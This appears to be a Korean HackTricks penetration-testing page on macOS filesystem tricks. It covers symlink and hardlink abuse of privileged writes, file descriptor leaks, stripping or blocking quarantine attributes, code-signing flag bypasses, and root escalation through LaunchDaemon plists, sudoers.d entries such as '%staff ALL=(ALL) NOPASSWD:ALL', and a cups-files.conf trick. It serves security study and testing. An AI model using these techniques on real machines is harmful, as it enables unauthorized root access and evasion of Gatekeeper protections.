# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory**의 경우, 세 가지 permission bit는 일반 파일에서의 의미와 다릅니다. `chmod(1)`는 directory에 적용될 때 execute bit를 "**search**"라고 부릅니다:<sup>[2]</sup>

> `0100` For files, allow execution by owner. For directories, allow the owner to **search** in the directory.

- **read** - directory entry를 **열거**할 수 있습니다(이름을 나열).
- **write** - directory 안에 entry를 **생성, 이름 변경 및 삭제**할 수 있습니다. 이는 파일 자체가 아니라 *포함하는* directory의 속성이라는 점에 유의해야 합니다. 부모 directory에 write할 수 있다면, 읽거나 쓸 수 없는 파일도 삭제할 수 있습니다.
- **subdirectory**를 삭제하려면 비어 있어야 하며, 이를 위해서는 내부의 모든 항목을 제거할 수 있을 만큼의 권한이 필요합니다.
- directory에 **sticky bit**(`S_ISVTX`, `/tmp`와 같음)가 설정되어 있으면 제한됩니다. POSIX에 따르면, 이 경우 process는 파일을 소유하거나 directory를 소유하거나 적절한 privilege를 가진 경우에만 해당 directory 안의 파일을 삭제하거나 이름을 변경할 수 있습니다.<sup>[1]</sup>
- **execute / search** - directory를 **traverse할 수 있습니다**. Pathname resolution은 각 component를 "predecessor가 지정한 directory 안에서" 찾으므로, path prefix의 단 하나의 component에서라도 search 권한을 잃으면 leaf file 자체가 world-readable이더라도 그 아래의 모든 항목에 path로 접근할 수 없게 됩니다.<sup>[1]</sup>

### Dangerous Combinations

**root가 소유한 file/folder를 overwrite하는 방법**:

- path 내 하나의 parent **directory owner**가 user인 경우
- path 내 하나의 parent **directory owner**가 **write access**를 가진 **users group**인 경우
- users **group**이 **file**에 **write** access를 가진 경우

앞의 조합 중 하나라도 있으면, attacker는 예상된 path에 **sym/hard link**를 **inject**하여 privileged arbitrary write를 수행할 수 있습니다.

### Folder root R+X special case

이는 위의 pathname-resolution 규칙에서 바로 도출됩니다. directory가 **root에게만 R+X**를 부여한다면, 그 안의 파일은 다른 모든 사용자에게 *path로* 접근할 수 없습니다. 하지만 **파일 자체의 permission bit는 여전히 permissive할 수 있습니다**. 이를 가로막는 유일한 것은 directory입니다.

따라서 파일을 해당 directory **밖으로 꺼낼 수 있는** primitive — attacker가 선택한 path를 사용자가 traverse할 수 있는 위치로 **이동/이름 변경/복사**하는 privileged process — 는 파일 자체의 mode를 무력화하지 않고도 arbitrary read로 이어집니다:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
권한이 높은 파일 이동 도구(installers, log rotators, crash/diagnostic collectors, backup 및 "export" 기능) 중 권한이 낮은 사용자가 source path를 지정할 수 있는 것을 찾으세요.

## Symbolic Link / Hard Link

### 권한이 허용적인 file/folder

권한이 높은 process가 **권한이 낮은 사용자**에 의해 **제어될 수 있는** 또는 권한이 낮은 사용자가 **이전에 생성할 수 있었던** **file**에 데이터를 쓰는 경우입니다. 사용자는 Symbolic 또는 Hard link를 통해 해당 file을 **다른 file을 가리키도록** 만들 수 있으며, 그러면 권한이 높은 process가 그 file에 데이터를 씁니다.

공격자가 **임의 쓰기를 악용하여 권한을 상승**시킬 수 있는 다른 경우는 다른 섹션에서 확인하세요.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)에 따르면: *"`O_NOFOLLOW`가 mask에 사용되고 `open()`에 전달된 target file이 symbolic link이면 `open()`이 실패합니다."* 마지막 component만 확인되며, 모든 **중간** component는 계속 해석되고 따라갑니다. 따라서 `O_NOFOLLOW`로 쓰기를 "보호"한 developer도 target path의 **parent directory**에 symlink를 심어 공격할 수 있습니다.<sup>[3]</sup>

동일한 man page에는 이 문제를 실제로 해결하는 flags가 설명되어 있습니다.<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"`open()`에 전달된 path의 어느 component라도 symbolic link이면 `open()`이 실패합니다."*
- **`O_RESOLVE_BENEATH`** — *"지정된 path resolution이 fd와 연결된 directory를 벗어나면 `openat()`이 실패합니다."*

그 외에는 이미 검증한 directory FD를 기준으로 한 `openat()` 또는 `realpath()` 후 재검증하는 방법이 path 중간의 symlink 교체를 막을 수 있습니다.

## .fileloc

**`.fileloc`** extension을 사용하는 file은 다른 application 또는 binary를 가리킬 수 있으므로, 해당 file이 열리면 그 application/binary가 실행됩니다.\
예시:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 파일 디스크립터

### Leak FD (`O_CLOEXEC` 없음)

`open` 호출에 `O_CLOEXEC` 플래그가 없으면 file descriptor가 child process에 상속됩니다. 따라서 privileged process가 privileged file을 열고 attacker가 제어하는 process를 실행하면, attacker는 **privileged file에 대한 FD를 상속**하게 됩니다.

대표적인 예는 **OS X 10.10의 `DYLD_PRINT_TO_FILE` LPE**입니다 ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld`는 해당 변수가 `processDyldEnvironmentVariable()` 외부에서 파싱되었기 때문에 **restricted (suid root) binary**에서도 `DYLD_PRINT_TO_FILE=/path`를 허용했습니다.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`를 실행했으므로, **임의의 경로에 root 소유 file을 생성**했습니다.
- FD가 **절대 close되지 않았고 close-on-exec 플래그도 없었으므로**, suid binary의 모든 child는 **root 소유 file에 대한 writable FD**를 상속했습니다.
- 예를 들어 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`를 실행한 다음 child에서 상속된 FD 번호를 읽으면 임의의 root 소유 write가 가능했습니다. `fcntl(fd, F_SETFL, 0)`는 `O_APPEND`를 제거하여 append 대신 overwrite도 가능하게 했습니다.

privileged process가 사용자가 제어하는 대상을 `exec`하기 **전에** file을 여는 경우에는 동일한 형태가 나타납니다(helper tools, `$EDITOR`를 통해 호출되는 `crontab` 스타일 editor, env-var 경로에서 열리는 log/debug files 등). 다음 명령으로 상속된 FD를 열거할 수 있습니다:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2`를 초과하면서 직접 열 수 없는 파일을 가리키는 모든 것은 arbitrary-write(또는 arbitrary-read) primitive입니다.

## quarantine xattrs tricks 방지

### 제거하기
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

파일/폴더에 이 immutable attribute가 설정되어 있으면 해당 파일/폴더에 xattr를 설정할 수 없습니다.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr를 지원하지 않는 파일 시스템

macOS가 mount할 수 있는 모든 파일 시스템이 **extended attributes**를 native로 저장하는 것은 아닙니다. HFS+와 APFS는 지원하지만, **FAT32, exFAT 및 (대부분의) NFS mount는 지원하지 않습니다** — macOS는 `._<filename>`이라는 **AppleDouble** side file을 작성하여 이를 에뮬레이트합니다 ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

이는 quarantine에 중요합니다. xattr는 동일한 volume에서 실제로 작성되고 **다시 읽을 수 있는 경우에만** 유지되기 때문입니다:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
볼륨을 나중에 `._` companion을 무시하는 경로에서 읽거나(또는 companion이 제거/삭제되면), 해당 파일은 **quarantine flag 없이** 전달됩니다. 그리고 quarantine되지 않은 `.app`만으로도 App Sandbox를 벗어나기에 충분합니다. 자세한 내용은 [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)를 참고하세요.

### writeextattr ACL

이 ACL은 파일에 `xattrs`를 추가하는 것을 방지합니다.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 파일 형식은 ACE를 포함하여 파일을 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 xattr `**com.apple.acl.text**` 내부에 저장된 ACL 텍스트 표현이 압축 해제된 파일의 ACL로 설정되는 것을 확인할 수 있습니다. 따라서 다른 xattr이 기록되지 않도록 방지하는 ACL이 포함된 **AppleDouble** 파일 형식으로 application을 zip 파일로 압축하면 application에 quarantine xattr이 설정되지 않습니다:

자세한 내용은 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.<sup>[6]</sup>

이를 재현하려면 먼저 올바른 acl 문자열을 가져와야 합니다:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(이 방법이 작동하더라도 sandbox가 먼저 quarantine xattr을 기록한다는 점에 유의하세요)

정말 필요하지는 않지만 혹시 모르니 남겨 둡니다:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## signature checks 우회

### platform binaries checks 우회

일부 security checks는 바이너리가 **platform binary**인지 확인합니다. 예를 들어 XPC service 연결을 허용하기 위해서입니다. 하지만 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/의 우회 방법에서 설명하듯이, platform binary(`/bin/ls` 등)를 가져온 다음 환경 변수 `DYLD_INSERT_LIBRARIES`를 사용해 dyld를 통해 exploit을 inject하면 이 check를 우회할 수 있습니다.<sup>[7]</sup>

### `CS_REQUIRE_LV` 및 `CS_FORCED_LV` flags 우회

실행 중인 바이너리가 다음과 같은 code를 사용해 자신의 flags를 수정하여 checks를 우회할 수 있습니다.<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures 우회

Bundles에는 **bundle** 내 모든 **file**의 **hash**가 포함된 **`_CodeSignature/CodeResources`** 파일이 있습니다. **CodeResources**의 hash도 **executable**에 **embedded**되어 있으므로, 이 파일 역시 변경할 수 없습니다.

하지만 signature가 확인되지 않는 일부 파일이 있으며, 이러한 파일은 plist에서 `omit` 키를 사용합니다. 예를 들면:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLI에서 다음과 같이 resource의 signature를 계산할 수 있습니다:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg 마운트

사용자는 기존 폴더 위에도 직접 생성한 custom dmg를 마운트할 수 있습니다. 다음과 같이 custom content가 포함된 custom dmg package를 생성할 수 있습니다:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
일반적으로 macOS는 `com.apple.DiskArbitrarion.diskarbitrariond` Mach service(`/usr/libexec/diskarbitrationd`에서 제공)와 통신하여 디스크를 mount합니다. LaunchDaemons plist 파일에 `-d` 파라미터를 추가하고 재시작하면 `/var/log/diskarbitrationd.log`에 로그가 저장됩니다.\
하지만 `hdik` 및 `hdiutil`과 같은 tools를 사용하여 `com.apple.driver.DiskImages` kext와 직접 통신할 수도 있습니다.

## 임의 쓰기

### 주기적 sh scripts

script가 **shell script**로 해석될 수 있다면 매일 trigger되는 **`/etc/periodic/daily/999.local`** shell script를 overwrite할 수 있습니다.

다음 명령으로 이 script의 실행을 **fake**할 수 있습니다: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**와 같은 임의의 **LaunchDaemon**을 작성하고, 다음과 같이 임의의 script를 실행하는 plist를 지정합니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh`에 root로 실행하고 싶은 **commands**를 생성하기만 하면 됩니다.

### Sudoers File

**arbitrary write** 권한이 있다면 **`/etc/sudoers.d/`** 폴더 안에 자신에게 **sudo** 권한을 부여하는 파일을 생성할 수 있습니다.

### PATH files

**`/etc/paths`** 파일은 PATH env variable을 구성하는 주요 위치 중 하나입니다. 파일을 덮어쓰려면 root 권한이 필요하지만, **privileged process**의 스크립트가 **full path 없이** 일부 **command**를 실행한다면 이 파일을 수정하여 해당 **command를 hijack**할 수 있습니다.

또한 **`/etc/paths.d`**에 파일을 작성하여 새로운 폴더를 `PATH` env variable에 불러올 수 있습니다.

### cups-files.conf

이 technique은 [this writeup](https://www.kandji.io/blog/macos-audit-story-part1)에서 사용되었습니다.<sup>[8]</sup>

다음 내용으로 `/etc/cups/cups-files.conf` 파일을 생성합니다:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
이렇게 하면 권한이 777인 `/etc/sudoers.d/lpe` 파일이 생성됩니다. 끝부분의 불필요한 내용은 오류 로그 생성을 트리거하기 위한 것입니다.

그런 다음 `/etc/sudoers.d/lpe`에 `%staff ALL=(ALL) NOPASSWD:ALL`과 같이 권한을 escalate하는 데 필요한 config를 작성합니다.

그런 다음 `/etc/cups/cups-files.conf`를 다시 수정하여 `LogFilePerm 700`을 지정하면, `cupsctl`을 호출할 때 새 sudoers 파일이 유효해집니다.

### Sandbox Escape

FS arbitrary write를 사용하면 macOS sandbox에서 탈출할 수 있습니다. 몇 가지 예시는 [macOS Auto Start](../../../../macos-auto-start-locations.md) 페이지를 참고하세요. 일반적인 방법 중 하나는 시작 시 명령을 실행하는 Terminal preferences 파일을 `~/Library/Preferences/com.apple.Terminal.plist`에 작성한 다음 `open`을 사용해 호출하는 것입니다.

## 다른 사용자로 writable files 생성

매우 일반적인 privesc primitive는 **권한이 있는 프로세스가 사용자가 제어하는 디렉터리에 파일을 생성하도록 만든 다음**, 해당 파일에 대한 **write access**를 유지하는 것입니다. 이를 위해서는 다음 두 가지 요소가 필요합니다.

1. 사용자가 소유한 디렉터리(또는 **inheritable ACL**을 설정할 수 있는 디렉터리)여야 하며, 내부에 생성되는 모든 항목이 사용자의 권한을 상속해야 합니다.
2. 파일을 생성할 **위치**를 지정할 수 있는 권한 있는/`suid` 프로세스가 필요합니다. 일반적으로 이는 debug/logging environment variable, config file 또는 helper의 XPC API를 통해 지정합니다.

생성된 파일이 다른 사용자의 소유임에도 사용자가 해당 파일에 write access를 가질 수 있는 이유는 **inheritable ACL**입니다. `file_inherit` / `directory_inherit` inheritance flags는 [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html)에 문서화되어 있습니다.
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
이제 권한이 있는 프로세스가 `$DIRNAME` 내부에 생성하는 모든 파일은 **당신이 쓸 수 있습니다**. 해당 디렉터리가 나중에 **root 권한으로 실행되는 위치**(`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, LaunchDaemon 디렉터리 등)이기도 하다면, 이는 직접적인 root escalation으로 이어집니다. 파일을 확보한 후 무엇을 작성해야 하는지는 위의 [Sudoers File](#sudoers-file) 및 [cups-files.conf](#cups-filesconf) 섹션을 참조하세요.

"env variable이 root 프로세스로 하여금 파일을 생성하게 만들고, FD가 당신에게 leak되는" 전체 예제는 위의 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)를 참조하세요.

## POSIX Shared Memory

**POSIX shared memory**는 POSIX 호환 운영 체제의 프로세스가 공통 메모리 영역에 접근할 수 있도록 하여, 다른 inter-process communication 방식보다 빠른 통신을 가능하게 합니다. `shm_open()`으로 shared memory object를 생성하거나 열고, `ftruncate()`로 크기를 설정한 다음, `mmap()`을 사용해 프로세스의 주소 공간에 매핑합니다. 그러면 프로세스는 이 메모리 영역을 직접 읽고 쓸 수 있습니다. 동시 접근을 관리하고 데이터 손상을 방지하기 위해 mutex 또는 semaphore와 같은 synchronization mechanism이 자주 사용됩니다. 마지막으로 프로세스는 `munmap()` 및 `close()`로 shared memory의 매핑을 해제하고 닫으며, 선택적으로 `shm_unlink()`로 memory object를 제거할 수 있습니다. 이 시스템은 여러 프로세스가 shared data에 빠르게 접근해야 하는 환경에서 효율적이고 빠른 IPC를 구현하는 데 특히 효과적입니다.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer Code Example</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**는 사용자 애플리케이션에서 **file descriptor operations**의 안전성과 신뢰성을 향상하기 위해 macOS에 도입된 보안 기능입니다. 이러한 guarded descriptors는 file descriptor에 특정 제한 또는 "guards"를 연결하는 방법을 제공하며, 이는 kernel에 의해 적용됩니다.

이 기능은 **unauthorized file access** 또는 **race conditions**와 같은 특정 유형의 보안 취약점을 방지하는 데 특히 유용합니다. 이러한 취약점은 예를 들어 한 thread가 file description에 접근하여 **another vulnerable thread access over it**을 허용하거나, file descriptor가 **vulnerable child process**에 **inherited**될 때 발생합니다. 이 기능과 관련된 일부 함수는 다음과 같습니다.

- `guarded_open_np`: guard와 함께 FD를 엽니다.
- `guarded_close_np`: FD를 닫습니다.
- `change_fdguard_np`: descriptor의 guard flags를 변경합니다(guard protection을 제거하는 것도 가능).

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec가 없는 leaked FD)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
